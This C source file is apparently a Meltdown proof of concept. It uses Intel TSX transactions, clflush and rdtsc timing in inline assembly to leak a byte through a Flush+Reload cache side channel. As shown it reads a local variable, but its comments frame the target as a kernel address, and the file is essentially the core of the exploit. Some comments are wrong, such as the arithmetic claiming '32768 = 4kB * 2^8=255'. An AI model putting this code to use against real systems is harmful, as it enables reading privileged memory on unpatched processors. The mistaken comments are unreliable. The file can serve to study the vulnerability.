// Copyright (c) Michael Yoo <michael@yoo.id.au>
// All Rights Reserved

// gcc -o m meltdown.c -masm=intel

#include <stdio.h>
#include <stdint.h>
#include <sys/time.h>
#include <stdlib.h>

/*
 * Prior reading:
 *
 * Meltdown Paper
 * https://meltdownattack.com/meltdown.pdf
 *
 * FLUSH + RELOAD Side Channel Paper
 * https://eprint.iacr.org/2013/448.pdf
 *
 * GNU GCC Extended Inline Assembly
 * https://gcc.gnu.org/onlinedocs/gcc/Using-Assembly-Language-with-C.html
 *
 * Transactional Memory (TSX-NI) XBEGIN / XEND
 * https://software.intel.com/en-us/node/524025
 * https://software.intel.com/en-us/node/695154
 *
 * Miscellaneous
 * https://software.intel.com/en-us/articles/introduction-to-x64-assembly
 * https://razorpay.com/blog/meltdown-paper-summary/
 */

int main(int argc, char **argv) {

    uint8_t some_data = 0xff;

    // I'd rather not allocate this injective side-channel
    // on the stack since the stack goes towards less significant, not more significant
    // and x86/x64 addressing can only add two registers, not subtract
    //
    // 32768 = 4kB (page size) * 2^8=255 possible combinations; see `jz retry`
    uint8_t *probe_array = calloc(4096 * 256 /* 0..255 */, sizeof(uint8_t));
    if (probe_array == NULL) {
        perror("Failed to allocate memory for side channel!\n");
        exit(1);
    }

    // Flush all cache lines
    for (int i = 0; i < 256; i++) {
        asm volatile ("clflush [%0] \n\t"::"r" (probe_array + (i * 4096)));
    }

    uint32_t lowestTime = UINT32_MAX;
    int lowestVal = -1;

    for (int i = 0; i < 256; i++) {
        uint32_t time = 0;

        // rcx = kernel address
        // rbx = probe array
        // Here, the value is shifted by 0xc (4096) to avoid the page prefetcher
        //       avoiding side-channel pollution
        // Here, `jz retry` skips cases where transient execution was rolled back
        //       making `shl rax, 0xc` zero which avoids side-channel pollution.
        asm volatile ("mfence                           \n\t" // Memory store serialising barrier
                      "lfence                           \n\t" // Memory load and instruction serialising barrier

                      "xor rax, rax                     \n\t" // Scrub `rax` for use with `al`

                      "xbegin skip                      \n\t"

                      // BEGIN TRANSIENT EXECUTION
                      "retry:                           \n\t"
                      "mov al, BYTE PTR [%0]            \n\t"
                      "shl rax, 0xc                     \n\t"
                      "jz retry                         \n\t"
                      "mov %1, QWORD PTR [%1 + rax]     \n\t"
                      // END TRANSIENT EXECUTION

                      "xend                             \n\t"
                      "skip:                            \n\t"

        ::"c" /* rcx */ (&some_data), /* rbx */ "b" (probe_array)
        : "rax", "al"
        );

        asm volatile ("mfence                   \n\t" // Memory store serialising barrier
                      "lfence                   \n\t" // Memory load and instruction serialising barrier

                      // Ensure `rdtsc` is not re-ordered to below by serialising instruction stream
                      "rdtsc                    \n\t"
                      "lfence                   \n\t"

                      // Backup `eax`
                      "mov esi, eax             \n\t"

                      // Access side-channel
                      "mov rax, QWORD PTR [%1]  \n\t"

                      // Ensure `rdtsc` is not re-ordered to above by serialising instruction stream
                      "lfence                   \n\t"
                      "rdtsc                    \n\t"

                      // Measure time taken to access memory
                      "sub eax, esi             \n\t"
                      "mov %0, eax              \n\t"

        : "=rm" (time)
        : "r" (probe_array + (i * 4096))
        : "eax", "edx" /* used for rdtsc */, "rax", "esi"
        );

        //printf("[0x%02x] %u\n", i, time);
        if (time < lowestTime) {
            lowestTime = time;
            lowestVal = i;
        }
    }

    printf("[0x%02x] %u\n", lowestVal, lowestTime);

    return 0;
}